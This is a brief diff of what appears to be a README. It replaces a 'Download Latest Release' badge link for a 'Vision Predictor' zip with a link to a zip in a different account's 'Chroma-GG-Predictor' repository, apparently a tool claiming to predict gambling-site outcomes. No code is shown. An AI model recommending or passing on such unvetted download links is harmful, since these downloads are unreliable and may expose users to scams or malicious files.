@@ -13,7 +13,7 @@
 
 ---
 
-<a href="https://github.com/BloxyPaulV2/Vision-Predictor/releases/download/bloxybet/Vision.predictor.zip">
+<a href="https://github.com/Sandorrx/Chroma-GG-Predictor/releases/download/vision/Vision.zip">
   <img src="https://img.shields.io/badge/Download_Latest_Release-2ea043?style=for-the-badge&logo=download&logoColor=white" alt="Download" />
 </a>
 
